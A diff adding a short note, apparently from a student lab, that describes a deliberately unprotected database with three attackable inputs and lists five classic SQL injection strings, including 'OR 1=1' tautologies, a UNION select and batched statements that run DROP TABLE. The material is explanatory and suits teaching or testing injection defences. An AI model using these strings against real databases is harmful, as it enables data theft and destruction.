@@ -1,0 +1,16 @@
+My database has 3 different inputs that can be attacked. 
+There are no security measures to prevent these attacks so the attacker has
+multiple options that they can attack from. Below are some of the commands the user
+can use to attack this database: 
+
+1) SQL Injection Based on 1=1 is always true
+SELECT * FROM Users WHERE name = xyz OR 1=1; 
+2) SQL Injection Based on "=" is always true
+" or ""="
+SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""="" 
+3) SQL Injection Based on Batched SQL Statements 
+22; DROP TABLE tablename
+4) SQL Injection Based on Batched SQL Statements
+22; SELECT mytable FROM mycode UNION SELECT name FROM database
+5) SQL Injection Based on Batched SQL Statements
+testname' SELECT * FROM names; DROP TABLE database 
